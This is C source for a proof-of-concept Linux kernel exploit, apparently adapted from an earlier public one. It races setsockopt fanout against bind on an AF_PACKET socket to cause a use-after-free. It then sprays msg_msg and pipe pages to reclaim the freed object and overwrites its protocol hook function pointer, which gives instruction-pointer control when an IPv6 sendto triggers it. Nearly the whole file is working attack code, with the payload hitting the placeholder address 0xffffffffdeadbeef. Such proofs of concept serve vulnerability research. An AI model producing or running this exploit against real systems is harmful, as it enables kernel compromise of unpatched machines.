/* A Proof-of-Concept demonstrating ip control, modified from ww9210's exploit
 * author: Lewis_Chen_
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/utsname.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sched.h>
#include <netinet/ip.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <unistd.h>
#include "libexp.h"
#include "libpagespray.c"

#define ETH_P_ARP   0x0806	  /* Address Resolution packet	*/
#define FORK_NUM 8
#define CRASH_IP 0xffffffffdeadbeef

#define STRUCT_LEN 4096

/*********************** Race to free *****************************/

struct sll {
	unsigned short  sll_family;
	short   sll_protocol; // big endian
	int sll_ifindex;
	unsigned short  sll_hatype;
	unsigned char   sll_pkttype;
	unsigned char   sll_halen;
	unsigned char   sll_addr[8];
};

static int fd;
static struct ifreq ifr;
static struct sll addr;
int *stage;
int *status_ptr;
int *status_ptr2;
int *barrier;
struct msg_spray_t *spray_list[1000];
int spray_cnt = 0;
int cpu_id = 0;

char payload[4096];

void *task1(void *unused) {
	set_cpu((cpu_id) % cpu_num);
	status_ptr[0] = 1;
	while(*barrier == 0);

	// need race: check on po->running
	// also must be 1st or link wont register
	int fanout_val = 0x3;
	setsockopt(fd, 0x107, 18, &fanout_val, sizeof(fanout_val));		// alloc here -> fanout_add, net/packet/af_packet.c:1722
}

void *task2(void *unused) {
	set_cpu((cpu_id+2) % cpu_num);
	status_ptr[1] = 1;
	while(*barrier == 0);

	bind(fd, (struct sockaddr *)&addr, sizeof(addr));
}

void wait_ready(void)
{
	while(status_ptr[0] == 0 || status_ptr[1] == 0);
	*barrier = 1;
}

void stop(char *fmt) {
	puts(fmt);
	getchar();
}
#define IS_ERR(c, s) { if (c) perror(s); }
void loop_race() {
	int err, index;
	puts("loop_race()");

	char take_page_back_buffer[0x1000];  
    for (int i=0; i<0x1000/sizeof(payload); i++) {
    	memcpy(&take_page_back_buffer[i * sizeof(payload)], payload, sizeof(payload));
    }

	//stop("stop here");
	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	//stop("stop!");
	IS_ERR(fd == -1, "socket");

	strcpy((char *)&ifr.ifr_name, "lo");
	err = ioctl(fd, SIOCGIFINDEX, &ifr);
	IS_ERR(err == -1, "ioctl SIOCGIFINDEX");
	index = ifr.ifr_ifindex;

	err = ioctl(fd, SIOCGIFFLAGS, &ifr);
	IS_ERR(err == -1, "ioctl SIOCGIFFLAGS");

	ifr.ifr_flags &= ~(short)IFF_UP;
	err = ioctl(fd, SIOCSIFFLAGS, &ifr);
	IS_ERR(err == -1, "ioctl SIOCSIFFLAGS");

	*stage = 1;
	while (*stage == 1);

	addr.sll_family = AF_PACKET;
	addr.sll_protocol = 0x0; // need something different to rehook && 0 to skip register_prot_hook
	addr.sll_ifindex = index;

	struct msg_spray_t *warmup = msg_spray(NULL, 0x1000 - 0x30, 0x1000);
	msg_spray_clean(warmup);

	prep();
	
	spray_list[spray_cnt++] = msg_spray(NULL, 0x1000 - 0x30, 0x1000);

	//sleep(1);
	usleep(10000);

	puts("alloc start");
	pthread_t thread1, thread2;
	pthread_create (&thread1, NULL, task1, NULL);			// task1 alloc the obj in kmalloc-4096
	pthread_create (&thread2, NULL, task2, NULL);
	wait_ready();
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);
	
	spray_list[spray_cnt++] = msg_spray(NULL, 0x1000 - 0x30, 0x1000);

	//sleep(1);
	usleep(10000);

	for (int i = 0; i < spray_cnt; i++) {
		msg_spray_clean(spray_list[i]);
	}
	
	usleep(10000);
	puts("start to close");
	
	usleep(10000);

	close(fd);			//	free here, see: net/packet/af_packet.c +3023  in packet_release()

	int ret;
	for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
	    ret = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
	    //printf("ret: %#lx\n",ret);
	}

	cleanup();

}

/*********************** Heap spray *****************************/


struct msg
{
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msg msg={0x4141414141414141,{0}};

/*********************** Exploit Payload *****************************/

/*********************** Dereference after Free *****************************/
void trigger()
{
	int fd;
	char buf[] = " ";
	umem_alloc((void *)0x20000000, 0x1000);
	fd = socket(10, 2, 0);
	*(uint16_t*)0x20000fe4 = (uint16_t)0xa;
	*(uint16_t*)0x20000fe6 = (uint16_t)0x204e;
	*(uint32_t*)0x20000fe8 = (uint32_t)0x0;
	*(uint64_t*)0x20000fec = (uint64_t)0x0;
	*(uint64_t*)0x20000ff4 = (uint64_t)0x100000000000000;
	*(uint32_t*)0x20000ffc = (uint32_t)0x0;
	sendto(fd, buf, 1, 0, (struct sockaddr *)0x20000fe4ul, 0x1c); // use
}

void wait_for_all_status(int status)
{
    int done = 0;
    while(1) {
        for(int i=0; i<FORK_NUM; i++) {
            if(status_ptr2[i] != status) continue;
            if(i == FORK_NUM-1) return;
        }
    }
}

void spray_func(int idx)
{
	while(*stage == 0);
	status_ptr2[idx] = 1;

	while(*stage == 1);
	status_ptr2[idx] = 2;
}

void setup_payload(void)
{
	memset(payload, 'A', sizeof(payload));
	*(unsigned long*)(payload+0x820+0x30) = CRASH_IP; // packet_fanout.prot_hook.func - 0x850 (48 + 0x820)
	*(unsigned long*)(payload+0x828+0x30) = CRASH_IP; // packet_fanout.prot_hook.id_match
	//memcpy(msg.mtext, payload, STRUCT_LEN);

	stage = umem_alloc(NULL, 0x1000);
	barrier = stage + 1;
	status_ptr = stage + 2;
	status_ptr2 = stage + 10;
	*stage = 0;
	*barrier = 0;

	// for(int i=0; i<FORK_NUM; i++) {
	// 	if(!clean_fork()) {
	// 		set_cpu(i % cpu_num);
	// 		spray_func(i);
	// 		while(1);
	// 	}
	// }
}

void try_exploit(void)
{
	set_cpu(cpu_id);
	setup_payload();

    int ret;

    stress_percpu_cache(0,3000);
    stress_percpu_cache(1,3000);
	
	if(!clean_fork()) {
		setup_sandbox();
		loop_race(); // free
		*stage = 3;
		sleep(100000);// yield execution
	}
	while (*stage == 0);
	
	*stage = 2;

	while (*stage == 2);
	usleep(10000);

	//wait_for_all_status(1);
	trigger(); // use
	puts("trigger");
	//*stage = 2;
	//wait_for_all_status(2);
    	//cleanup();
	//puts("clean up");
}

int get_cpu_id(int argc, char **argv)
{
	if(argc < 2) return 0;
	int run_time = atoi(argv[1]);
	return run_time % cpu_num;
}

int main(int argc, char **argv) {
	cpu_id = get_cpu_id(argc, argv);

	for(int j=0; j<1337; j++) {
		printf("%dth iteration of race\n", j);
		if(!clean_fork()) {
			try_exploit();
			exit(0);
		}
		wait(NULL);
	}

	printf("race not win, please try again\n");
	return 0;
}
